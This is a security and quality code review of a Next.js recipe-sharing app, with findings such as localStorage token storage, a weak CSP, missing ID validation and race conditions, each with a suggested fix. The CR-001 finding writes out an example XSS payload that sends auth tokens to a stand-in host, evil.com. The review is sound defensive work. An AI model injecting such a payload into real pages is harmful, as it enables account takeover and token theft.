## Code Review — 2026-03-17

### Summary

Large full-stack Next.js recipe-sharing application with clean architecture. Auth tokens stored in localStorage combined with `unsafe-inline` CSP create a viable XSS-to-token-theft attack chain. Multiple API route parameters lack UUID validation, and several endpoints have race conditions or TOCTOU bugs.

### Findings

#### CRITICAL

**[CR-001]** Auth tokens stored in localStorage — XSS-to-token-theft attack vector

- **File:** `src/contexts/AuthContext.tsx:48-58`
- **Issue:** Bearer tokens are stored in `localStorage`, which is accessible to any JavaScript running on the page. Combined with CR-002 (`unsafe-inline` in CSP), a single reflected or stored XSS vulnerability would allow token exfiltration.
- **Impact:** Complete account takeover. An attacker injects `fetch('https://evil.com?t='+localStorage.getItem('auth_token'))` and steals every visiting user's session.
- **Suggested fix:** Move to HttpOnly secure cookies set by the server. The API routes already read the `Authorization` header — add a middleware that reads the cookie and sets the header, or switch entirely to cookie-based auth.

**[CR-002]** CSP allows `unsafe-inline` for scripts, nullifying XSS protection

- **File:** `src/middleware.ts:73`
- **Issue:** `script-src 'self' 'unsafe-inline'` disables the primary XSS protection offered by CSP. Next.js requires inline scripts, but the correct mitigation is nonce-based CSP, not blanket `unsafe-inline`.
- **Impact:** Any XSS payload executes without CSP blocking it, directly enabling CR-001.
- **Suggested fix:** Use `next/headers` to generate a per-request nonce and apply it to both the CSP header and the inline `<script>` tags. Next.js 13+ supports this pattern.

**[CR-003]** Missing UUID validation on route parameters across 8+ API endpoints

- **File:** `src/app/api/recipes/[id]/route.ts`, `src/app/api/recipes/[id]/like/route.ts`, `src/app/api/recipes/[id]/save/route.ts`, `src/app/api/recipes/[id]/comments/route.ts`, `src/app/api/recipes/[id]/comments/[commentId]/route.ts`, `src/app/api/notifications/[id]/route.ts`, `src/app/api/pantry/[id]/route.ts`
- **Issue:** Dynamic route parameters (`id`, `commentId`) are passed directly to Prisma `findUnique`/`delete`/`update` without UUID format validation. Only the admin routes (`admin/comments/[id]`, `admin/recipes/[id]`, `admin/users/[id]`) validate with `UUID_REGEX`.
- **Impact:** Malformed IDs hit the database unnecessarily. While Prisma prevents SQL injection, malformed UUIDs could trigger unexpected Prisma errors that leak schema information in error messages. Also inconsistent security posture across the API.
- **Suggested fix:** Add `UUID_REGEX` validation at the top of every dynamic route handler, matching the pattern already used in admin routes:

```typescript
const { id } = await params;
if (!UUID_REGEX.test(id)) {
  return NextResponse.json({ error: 'Invalid ID format' }, { status: 400 });
}
```

#### HIGH

**[CR-004]** Race condition in recipe save toggle — non-atomic check-then-act

- **File:** `src/app/api/recipes/[id]/save/route.ts:55-87`
- **Issue:** The save toggle reads `existingSave`, then creates or deletes based on the result — without a transaction. Two concurrent requests could both find `existingSave === null` and both attempt to create, or both find it and both attempt to delete. The unique constraint catch mitigates the create case, but the pattern is fragile.
- **Impact:** Race condition could cause inconsistent state. The `Record to delete does not exist` catch masks the double-delete, but the user could see a flicker of incorrect save state.
- **Suggested fix:** Wrap in `prisma.$transaction` like the like toggle endpoint already does:

```typescript
const result = await prisma.$transaction(async (tx) => {
  const existing = await tx.savedRecipe.findUnique({
    where: { userId_postId: { userId: payload.userId, postId: recipeId } },
  });
  if (existing) {
    await tx.savedRecipe.delete({ where: { id: existing.id } });
    return { saved: false };
  } else {
    await tx.savedRecipe.create({ data: { userId: payload.userId, postId: recipeId } });
    return { saved: true };
  }
});
```

**[CR-005]** Invalid Date silently stored in database for pantry item expiry

- **File:** `src/app/api/pantry/[id]/route.ts:73` and `src/app/api/pantry/route.ts:88`
- **Issue:** `expiresAt: expiresAt ? new Date(expiresAt) : null` — if `expiresAt` is a malformed date string like `"not-a-date"`, `new Date("not-a-date")` returns `Invalid Date`, which Prisma may store as `null` or throw depending on the database driver. No validation exists.
- **Impact:** Corrupted data in the database. Downstream code that reads `expiresAt` and performs date comparisons could crash or produce incorrect results.
- **Suggested fix:**

```typescript
if (expiresAt !== undefined) {
  const parsedDate = new Date(expiresAt);
  if (isNaN(parsedDate.getTime())) {
    return NextResponse.json({ error: 'Invalid expiry date' }, { status: 400 });
  }
}
```

**[CR-006]** Timezone-dependent date boundary in cooked recipe deduplication

- **File:** `src/app/api/cooked-recipes/route.ts:89-92`
- **Issue:** `const today = new Date(); today.setHours(0, 0, 0, 0);` uses the server's local timezone. In serverless environments (Vercel), the timezone is typically UTC but not guaranteed. Different invocations could use different timezones, making the "once per day" check inconsistent.
- **Impact:** Users could mark a recipe as cooked twice on the same calendar day (or be prevented from marking it on a valid new day) depending on which server instance handles the request.
- **Suggested fix:**

```typescript
const today = new Date();
today.setUTCHours(0, 0, 0, 0);
```

**[CR-007]** In-memory rate limiting is ineffective in serverless deployments

- **File:** `src/middleware.ts:9-10`
- **Issue:** `const rateLimitMap = new Map<...>()` is per-process. In Vercel/serverless, each cold start creates a new empty map. The comment on line 9 acknowledges this, but the implementation provides a false sense of security.
- **Impact:** Rate limiting provides zero protection in production serverless deployments. Auth endpoints (`/api/auth/login`, `/api/auth/register`) intended to have 10-request limits are effectively unlimited, enabling brute-force attacks.
- **Suggested fix:** Replace with Vercel KV, Upstash Redis, or use Vercel's built-in edge rate limiting. At minimum, add a startup log warning when deployed to a serverless environment.

**[CR-008]** No request cancellation for live search — stale results can overwrite newer ones

- **File:** `src/components/search/PersistentSearchBar.tsx:119-147`
- **Issue:** The debounced search effect creates new `fetch` calls without aborting previous ones. If request A (for "pa") takes longer than request B (for "pasta"), A's stale results will overwrite B's correct results when A resolves second.
- **Impact:** Users see search results for a previous, shorter query instead of their current query.
- **Suggested fix:**

```typescript
useEffect(() => {
  const controller = new AbortController();
  // ... debounce logic ...
  searchTimeoutRef.current = setTimeout(async () => {
    try {
      const response = await fetch(`/api/search?q=...`, { signal: controller.signal });
      // ...
    } catch (error) {
      if (error instanceof DOMException && error.name === 'AbortError') return;
      // ...
    }
  }, 300);
  return () => {
    controller.abort();
    if (searchTimeoutRef.current) clearTimeout(searchTimeoutRef.current);
  };
}, [query]);
```

#### MEDIUM

**[CR-009]** Pantry creation and item insertion are not fully atomic

- **File:** `src/app/api/pantry/route.ts:67-83`
- **Issue:** The pantry is found/created outside the transaction, then the item count and creation happen inside. If the pantry is deleted between the outer query and the transaction start, the `pantryId` FK reference becomes invalid.
- **Impact:** Rare but possible `Foreign key constraint failed` error that would result in a generic 500 response.
- **Suggested fix:** Move the `findUnique`/`create` inside the transaction:

```typescript
const item = await prisma.$transaction(async (tx) => {
  let pantry = await tx.userPantry.findUnique({ where: { userId: payload.userId } });
  if (!pantry) {
    pantry = await tx.userPantry.create({ data: { userId: payload.userId } });
  }
  // ... rest of logic
});
```

**[CR-010]** Profile endpoint returns up to 100 embedded items without pagination

- **File:** `src/app/api/users/[username]/profile/route.ts:64,115`
- **Issue:** The profile response includes `posts: { take: 50 }` and `savedRecipes: { take: 50 }`. For active users, this is a large payload (up to ~100 recipe objects with all fields). There's no cursor-based pagination for these embedded lists.
- **Impact:** Slow page loads for prolific users. Excessive bandwidth usage on mobile.
- **Suggested fix:** Reduce `take` to 12 (one page) and add `cursor`/`offset` parameters for loading more, or keep pagination on the client side with separate API calls.

**[CR-011]** Non-deterministic sort order for recipes with equal sort values

- **File:** `src/app/api/recipes/route.ts:67-78`
- **Issue:** The `orderBy` uses a single field (e.g., `{ averageRating: 'desc' }` or `{ reviewCount: 'desc' }`). When multiple recipes share the same value, PostgreSQL returns them in arbitrary order, causing pagination instability (items appearing/disappearing between pages).
- **Impact:** Users see duplicated or missing recipes when scrolling through pages with the "Highest Rated" or "Most Reviewed" sort.
- **Suggested fix:** Add a secondary sort on a unique field:

```typescript
orderBy = [{ averageRating: 'desc' }, { createdAt: 'desc' }];
```

**[CR-012]** Error swallowed silently in profile token verification

- **File:** `src/app/api/users/[username]/profile/route.ts:38-44`
- **Issue:** The `catch {}` block around token verification catches all errors, including unexpected ones (e.g., `container.getTokenService()` throwing because DI is misconfigured). The comment says "Token verification failed" but this hides all errors.
- **Impact:** Bugs in token verification would be invisible — the user would silently be treated as unauthenticated instead of seeing an error.
- **Suggested fix:** Log unexpected errors:

```typescript
} catch (error) {
  // Only silence expected JWT verification failures
  if (!(error instanceof JsonWebTokenError || error instanceof TokenExpiredError)) {
    console.error('Unexpected error during token verification:', error);
  }
}
```

**[CR-013]** `CLOUDINARY_CLOUD_NAME` env var missing causes silent image rejection

- **File:** `src/app/api/recipes/[id]/comments/route.ts:74-84`
- **Issue:** The Cloudinary URL validation checks `!cloudName` — if the env var is not set, every image upload is rejected with "Image must be uploaded through the app". No logging or specific error message indicates the root cause.
- **Impact:** All comment image uploads silently fail in environments where `CLOUDINARY_CLOUD_NAME` is not configured.
- **Suggested fix:** Check env var at startup or log a specific error:

```typescript
if (!cloudName) {
  console.error('CLOUDINARY_CLOUD_NAME is not configured');
  return NextResponse.json({ error: 'Image upload not configured' }, { status: 500 });
}
```

**[CR-014]** Duplicated framer-motion mock across 15+ test files

- **File:** `src/components/recipe/__tests__/CommentsSection.test.tsx`, `CreateRecipeForm.test.tsx`, `EditRecipeModal.test.tsx`, `MatchedRecipes.test.tsx`, `RecipeCard.test.tsx`, `RecipeFeed.test.tsx`, and 9+ more
- **Issue:** Every test file independently defines its own framer-motion mock with slight variations. Some mock `motion.create`, some mock `motion.div`, some filter props differently. This creates maintenance burden and inconsistent test behavior.
- **Impact:** When framer-motion API changes, 15+ files need updating. Subtle differences in mocks could hide bugs.
- **Suggested fix:** Create a shared mock in `src/__tests__/mocks/framer-motion.ts` and reference it from `jest.config`:

```typescript
// jest.config.js
moduleNameMapper: {
  'framer-motion': '<rootDir>/src/__tests__/mocks/framer-motion.ts',
}
```

#### LOW

**[CR-015]** Notification polling without exponential backoff

- **File:** `src/components/Navigation.tsx:236-248`
- **Issue:** Notifications poll every 60 seconds unconditionally. If the server returns errors, the same 60-second interval continues. No exponential backoff for failures, no reduction for idle tabs beyond the visibility check.
- **Impact:** Unnecessary server load during errors. Could contribute to thundering herd when server recovers.
- **Suggested fix:** Add exponential backoff on failure and increase interval when tab is in background but visible.

**[CR-016]** Cloudinary images orphaned when recipe deletion fails mid-operation

- **File:** `src/app/api/recipes/[id]/route.ts:126-136`
- **Issue:** The recipe is deleted from the database first, then the Cloudinary image cleanup happens. If the server crashes between these operations, the Cloudinary image is orphaned forever with no way to reconnect it. The `console.warn` on failure has no retry mechanism.
- **Impact:** Slow accumulation of orphaned images in Cloudinary storage over time.
- **Suggested fix:** Implement a cleanup job that periodically scans Cloudinary for images not referenced by any recipe, or use a soft-delete pattern where images are cleaned up asynchronously.

**[CR-017]** `env-validation.ts` is never auto-called

- **File:** `src/lib/env-validation.ts:140-142`
- **Issue:** The comment at the bottom explains that auto-validation was removed to prevent CI/CD build failures, but there's no evidence of `validateEnvironment()` being called anywhere in the actual app startup code (`layout.tsx`, `middleware.ts`, or an instrumentation file).
- **Impact:** The app can start with missing or invalid environment variables, discovering configuration errors only at runtime when the relevant code path is hit.
- **Suggested fix:** Call `validateEnvironment()` in `src/instrumentation.ts` (Next.js instrumentation hook) which runs once on server startup but not during build.

**[CR-018]** `averageRating` field on Post model casts incorrectly in raw SQL

- **File:** `src/app/api/admin/recalc-ratings/route.ts:21`
- **Issue:** `ROUND(AVG("rating")::numeric, 1)::float` — the cast chain `numeric -> round -> float` could introduce floating-point precision issues. PostgreSQL `float8` (double precision) can represent `4.5` exactly, but values like `3.7` may not round-trip perfectly between `numeric` and `float`.
- **Impact:** Minor inconsistency between ratings calculated via Prisma (`Math.round(...*10)/10`) and the bulk recalculation SQL. Could cause test flakiness if comparing exact values.
- **Suggested fix:** Use consistent rounding in both paths. Either always use the SQL approach or always use the JavaScript approach.
